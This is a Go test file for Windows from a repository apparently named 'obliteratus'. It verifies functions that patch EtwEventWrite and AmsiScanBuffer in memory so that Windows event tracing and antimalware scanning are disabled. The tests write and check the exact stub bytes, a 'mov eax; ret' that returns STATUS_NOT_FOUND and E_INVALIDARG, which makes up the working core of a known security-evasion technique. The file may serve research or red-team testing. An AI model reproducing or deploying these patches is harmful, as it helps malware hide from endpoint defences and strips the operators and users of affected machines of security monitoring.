//go:build windows

package research

import (
	"bytes"
	"errors"
	"testing"

	"golang.org/x/sys/windows"

	"github.com/DevCop95/obliteratus/internal/winname"
)

// readPrologue reads len(n) bytes at addr in the current process.
func readPrologue(t *testing.T, addr uintptr, n int) []byte {
	t.Helper()
	buf := make([]byte, n)
	var read uintptr
	if err := windows.ReadProcessMemory(windows.CurrentProcess(), addr, &buf[0], uintptr(n), &read); err != nil || read != uintptr(n) {
		t.Fatalf("read prologue at 0x%x: err=%v read=%d", addr, err, read)
	}
	return buf
}

// TestPatchETWReal exercises the actual W^X patch path against this test
// process: it resolves the export, writes the stub, and confirms the bytes on
// the page really changed, then confirms a second call is a no-op. The patch is
// confined to this process and is what the module is designed to do.
func TestPatchETWReal(t *testing.T) {
	proc := ntdll.NewProc(winname.EtwWrite)
	if err := proc.Find(); err != nil {
		t.Skipf("cannot resolve %s: %v", winname.EtwWrite, err)
	}
	addr := proc.Addr()

	addr2, err := PatchETW()
	if err != nil {
		t.Fatalf("PatchETW: %v", err)
	}
	if addr2 != addr {
		t.Fatalf("PatchETW returned 0x%x, want 0x%x", addr2, addr)
	}
	if got := readPrologue(t, addr, len(etwPatch)); !bytes.Equal(got, etwPatch) {
		t.Fatalf("prologue after patch = % x, want % x", got, etwPatch)
	}
	if _, err := PatchETW(); !errors.Is(err, errAlreadyPatched) {
		t.Fatalf("second PatchETW = %v, want errAlreadyPatched", err)
	}
}

// TestPatchAMSIReal is the same verification for the AMSI scan-buffer patch.
func TestPatchAMSIReal(t *testing.T) {
	proc := amsiDLL.NewProc(winname.AmsiScan)
	if err := proc.Find(); err != nil {
		t.Skipf("cannot resolve %s (amsi.dll unavailable): %v", winname.AmsiScan, err)
	}
	addr := proc.Addr()

	addr2, err := PatchAMSI()
	if err != nil {
		t.Fatalf("PatchAMSI: %v", err)
	}
	if addr2 != addr {
		t.Fatalf("PatchAMSI returned 0x%x, want 0x%x", addr2, addr)
	}
	if got := readPrologue(t, addr, len(amsiPatch)); !bytes.Equal(got, amsiPatch) {
		t.Fatalf("prologue after patch = % x, want % x", got, amsiPatch)
	}
	if _, err := PatchAMSI(); !errors.Is(err, errAlreadyPatched) {
		t.Fatalf("second PatchAMSI = %v, want errAlreadyPatched", err)
	}
}

// TestPatchStubShapes pins the two stubs so a careless edit cannot silently
// change what the patches make the exports return.
func TestPatchStubShapes(t *testing.T) {
	// mov eax, imm32 ; ret
	wantEtw := []byte{0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3} // STATUS_NOT_FOUND
	if !bytes.Equal(etwPatch, wantEtw) {
		t.Errorf("etwPatch = % x, want % x", etwPatch, wantEtw)
	}
	wantAmsi := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3} // E_INVALIDARG
	if !bytes.Equal(amsiPatch, wantAmsi) {
		t.Errorf("amsiPatch = % x, want % x", amsiPatch, wantAmsi)
	}
}

// TestPatchPrologueRejectsEmpty guards the input check.
func TestPatchPrologueRejectsEmpty(t *testing.T) {
	if _, err := patchPrologue(ntdll.NewProc(winname.NtClose), nil); err == nil {
		t.Fatal("patchPrologue accepted an empty stub")
	}
}
